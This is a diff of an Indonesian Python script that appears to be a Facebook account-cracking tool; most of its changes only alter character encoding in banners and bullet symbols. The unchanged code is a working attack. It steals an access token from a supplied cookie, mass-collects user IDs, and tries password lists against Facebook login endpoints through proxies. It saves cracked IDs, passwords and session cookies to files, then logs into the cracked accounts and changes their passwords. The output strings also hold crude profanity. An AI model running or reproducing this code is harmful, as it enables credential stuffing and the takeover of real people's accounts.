@@ -119,14 +119,14 @@ def back():
 #------------------[ LOGO-LAKNAT ]-----------------#
 def banner():
 			print(f'''\t{asu}
-{m}•{k}•{h}•{sir}__________________×______________________
+{m}â€¢{k}â€¢{h}â€¢{sir}__________________Ã—______________________
 
   Auther          :     Resyah16
 
   Facebook        :     Resyah16
 
   Contact         :     081216xxxx16
-__________________×______________________ {x}{m}•{k}•{h}•{x}''')
+__________________Ã—______________________ {x}{m}â€¢{k}â€¢{h}â€¢{x}''')
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login():
 	try:
@@ -153,12 +153,12 @@ def login_lagi334():
 		banner()
 		cetak(nel('\tGunakan Akun Baru [green]Agar Tidak Mudah CheckPoint[white]'))
 		asu = random.choice([m,k,h,b,u])
-		cookie=input(f'  [{h}�{x}] Masukkan Cookies :{asu} ')
+		cookie=input(f'  [{h}•{x}] Masukkan Cookies :{asu} ')
 		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
 		find_token = re.search("(EAAG\w+)", data.text)
 		ken=open(".token.txt", "w").write(find_token.group(1));bot()
 		cok=open(".cok.txt", "w").write(cookie)
-		print(f'  {x}[{h}�{x}]{h} LOGIN GAGAL-- WKWK CANDA BANG-COBA JALANKAN ULANG!!{x} ');time.sleep(1)
+		print(f'  {x}[{h}•{x}]{h} LOGIN GAGAL-- WKWK CANDA BANG-COBA JALANKAN ULANG!!{x} ');time.sleep(1)
 		exit()
 	except Exception as e:
 		os.system("rm -f .token.txt")
@@ -184,7 +184,7 @@ def menu(my_name,my_id):
 	print(x+'['+h+'2'+x+'] Check \x1b[1;92m(ON)')
 	print(x+'['+h+'3'+x+'] Check \x1b[1;92m(ON)')
 	print(x+'['+h+'0'+x+'] Logout ')
-	_____alvino__adijaya_____ = input(x+'\n['+h+'•'+x+'] Select : ')
+	_____alvino__adijaya_____ = input(x+'\n['+h+'â€¢'+x+'] Select : ')
 	if _____alvino__adijaya_____ in ['1']:
 		dump_massal()
 	#elif _____alvino__adijaya_____ in ['2']:
@@ -278,7 +278,7 @@ def dump_massal():
 			print(' Sinyal Loh Kek Kontoll ')
 			exit()
 	try:
-		print(x+'['+h+'•'+x+'] Total : \x1b[1;92m'+str(len(id)))
+		print(x+'['+h+'â€¢'+x+'] Total : \x1b[1;92m'+str(len(id)))
 		setting()
 	except requests.exceptions.ConnectionError:
 		print(' Sinyal Lo kek Kontol ')
@@ -310,7 +310,7 @@ def dump_pengikut():
 		print('>> Gagal Mengambil Target ')
 		exit()
 #------------------[ CRACK-GRUP ]-----------------#
-balmond = b+"["+h+"✓"+b+"]"
+balmond = b+"["+h+"âœ“"+b+"]"
 
 def lah():
 	print("\r"+balmond+m+" \x1b[1;95mTotal ID Yang Terkumpul :\x1b[1;97m "+str(len(id))+"                     ")
@@ -466,7 +466,7 @@ def crack_file():
 def setting():
 	print(x+'\n['+h+'1'+x+'] Akun New \x1b[1;92m(Rekomendasi)')
 	print(x+'['+h+'2'+x+'] Akun Random  \x1b[1;92m(Rekomendasi)')
-	hu = input(x+'\n['+h+'•'+x+'] Select : ')
+	hu = input(x+'\n['+h+'â€¢'+x+'] Select : ')
 	#if hu in ['1','01']:
 		#for tua in sorted(id):
 			#id2.append(tua)
@@ -491,14 +491,14 @@ def setting():
 		exit()
 	print(x+'\n['+h+'1'+x+'] Mobile.Facebook \x1b[1;92m(Rekomendasi)')
 	print(x+'['+h+'2'+x+'] Mbasic.Facebook \x1b[1;92m(Rekomendasi)')
-	hc = input(x+'\n['+h+'•'+x+'] Select : ')
+	hc = input(x+'\n['+h+'â€¢'+x+'] Select : ')
 	if hc in ['1','01']:
 		method.append('mobile')
 	elif hc in ['']:
 		print(' Pilih Yang Bener Kontol ')
 		setting()
 	elif hc in ['2']:
-		print('→GW DAH BILANG Mbasic OF KONTOL😒')
+		print('â†’GW DAH BILANG Mbasic OF KONTOLðŸ˜’')
 		setting()
 	else:
 		method.append('mobile')
@@ -506,7 +506,7 @@ def setting():
 #-------------------[ BAGIAN-WORDLIST ]------------#
 def passwrd():
 	global prog,des
-	###print(f'>>>>> {m}•{k}•{h}•{x} Jangan Lupa Bismillah:v {m}•{k}•{h}•{x} <<<<< ')
+	###print(f'>>>>> {m}â€¢{k}â€¢{h}â€¢{x} Jangan Lupa Bismillah:v {m}â€¢{k}â€¢{h}â€¢{x} <<<<< ')
 	###print('')
 	print(f'\n[{h}>{x}] Hasil OK Tersimpan Di : OK/%s {x}'%(okc))
 	print(f'[{h}>{x}] Hasil CP Tersimpan Di : CP/%s {x}\n'%(cpc))
@@ -577,11 +577,11 @@ def crack(idf,pwv):
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print('\n')
-				statuscp = f'[�] ID: {idf} [�] PASSWORD : {pw} [�]UGEN : {ua}'
+				statuscp = f'[•] ID: {idf} [•] PASSWORD : {pw} [•]UGEN : {ua}'
 				statuscp1 = nel(statuscp, style='yellow')
 				cetak(nel(statuscp1, title='CP'))
 				open('CP/'+cpc,'a').write(idf+' | '+pw+'\n')
-				akun.append(idf+' � '+pw)
+				akun.append(idf+' • '+pw)
 				cp+=1
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
@@ -589,7 +589,7 @@ def crack(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				print('\n')
-				statusok = f'[�] ID       : {idf}\n[�] PASSWORD : {pw}\n[�] COOKIES  : {kuki}\n[�] UGEN : {ua}'
+				statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n[•] UGEN : {ua}'
 				statusok1 = nel(statusok, style='green')
 				cetak(nel(statusok1, title='OK'))
 				cek_apk(session,coki)
@@ -607,7 +607,7 @@ def gabut():
     print('\n [ hasil crack yang tersimpan di file anda ]\n')
     for file in dirs:
         print(" [%s+%s] %s"%(O,N,file))
-    jalan(f" [{M}�{N}] sebelum memasukan file,hidupkan mode pesawat 3 detik.");time.sleep(5)
+    jalan(f" [{M}×{N}] sebelum memasukan file,hidupkan mode pesawat 3 detik.");time.sleep(5)
     files = input("\n [%s?%s] masukan nama file : %s"%(M,N,H))
     try:
         buka_baju = open(f'CP/{files}','r').readlines()
@@ -616,10 +616,10 @@ def gabut():
     ww=input(f"\n {N}[{O}?{N}] ubah password ketika tap yes [Y/t]: ")
     if ww in ("Y","y","ya"):
         ubahP.append("y")
-        print(f" [{H}�{N}] contoh password : {H}Kebersama'n{N}")
+        print(f" [{H}•{N}] contoh password : {H}Kebersama'n{N}")
         pwBar=input(f"\n [{H}+{N}] masukan password baru : ")
         if len(pwBar) <= 5:
-             print('\n %s[%s�%s] kata sandi minimal 6 karakter'%(N,M,N))
+             print('\n %s[%s×%s] kata sandi minimal 6 karakter'%(N,M,N))
         else:
             pwBaru.append(pwBar)
     print('%s [%s*%s] Total %s%s%s Akun'%(N,O,N,K,str(len(buka_baju)),N))
@@ -627,9 +627,9 @@ def gabut():
     for memek in buka_baju:
         kontol = memek.replace('\n', '')
         titid  = kontol.split('|')
-        jalan(f' {N}[{M}>{N}] mencoba login ke akun : {K}{kontol.replace(" [�] ", "")}{N}')
+        jalan(f' {N}[{M}>{N}] mencoba login ke akun : {K}{kontol.replace(" [×] ", "")}{N}')
         try:
-            log_hasil(titid[0].replace(" [�] ", ""), titid[1])
+            log_hasil(titid[0].replace(" [×] ", ""), titid[1])
         except requests.exceptions.ConnectionError:
             continue
         print("")
@@ -661,7 +661,7 @@ def log_hasil(user, pasw):
         sys.stdout.write('\r %s[%s!%s] Hidupkan mode pesawat 2 detik         '%(N,M,N)),
     if "c_user" in session.cookies.get_dict():
         if "Akun Anda Dikunci" in urlPost.text:
-            print(f"\r {N}[{M}�{N}] akun sesi new")
+            print(f"\r {N}[{M}×{N}] akun sesi new")
         else:
             coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
             open('results/OKE.txt', 'a').write(f" [] {user}|{pasw}|{coki}\n")
@@ -691,16 +691,16 @@ def log_hasil(user, pasw):
             elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
                 print(' [%s!%s] opshh akunya terpasang autentikasi dua faktor :('%(M,N))
             else:
-                open('results/ERROR.txt', 'a').write(f" [�] {user}|{pasw}\n")
+                open('results/ERROR.txt', 'a').write(f" [×] {user}|{pasw}\n")
                 print(f" {N}[{M}!{N}] Error")
         else:
-            open(f'results/CP-DETEKTOR-{tgl}-{bln}-{thn}.txt', 'a').write(f" [�] {user}|{pasw}\n")
+            open(f'results/CP-DETEKTOR-{tgl}-{bln}-{thn}.txt', 'a').write(f" [×] {user}|{pasw}\n")
             print(" %s[%s*%s] Terdapat %s Opsi "%(N,O,N,len(cek)))
         for opt in range(len(cek)):
             print(f" [\x1b[1;92m{str(opt+1)}\x1b[0m] "+cek[opt])
     else:
         print(f"\r {N}[{M}!{N}] Kata sandi salah atau sudah diubah")
-        open('results/INVALID-OK.txt', 'a').write(f" [�] {user}|{pasw}\n")
+        open('results/INVALID-OK.txt', 'a').write(f" [×] {user}|{pasw}\n")
 
 #UBAH PW
 def ubah_pw(session,response,link2,user,mmk):
